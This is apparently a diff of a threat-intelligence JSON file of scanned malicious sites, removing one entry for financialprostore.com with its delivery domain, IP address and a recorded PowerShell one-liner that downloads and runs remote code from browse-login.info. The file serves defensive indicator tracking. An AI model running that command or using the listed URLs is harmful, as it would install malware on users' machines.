@@ -2037,27 +2037,5 @@
     ],
     "ReportId": "cmwwl1v8y024o0omlfdmj1ia6",
     "ScannedAt": "2026-11-25T20:35:21.405000+00:00"
-  },
-  {
-    "UrlDomain": "financialprostore.com",
-    "DeliveryUrl": [
-      "browse-login.info"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "45.40.147.96"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-login.info/083af9e16202853f",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-login[.]info/083af9e16202853f'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-login.info/083af9e16202853f"
-    ],
-    "ReportId": "cmwwkmver01io0omlprb0kkam",
-    "ScannedAt": "2026-11-25T20:23:41.768000+00:00"
   }
 ]
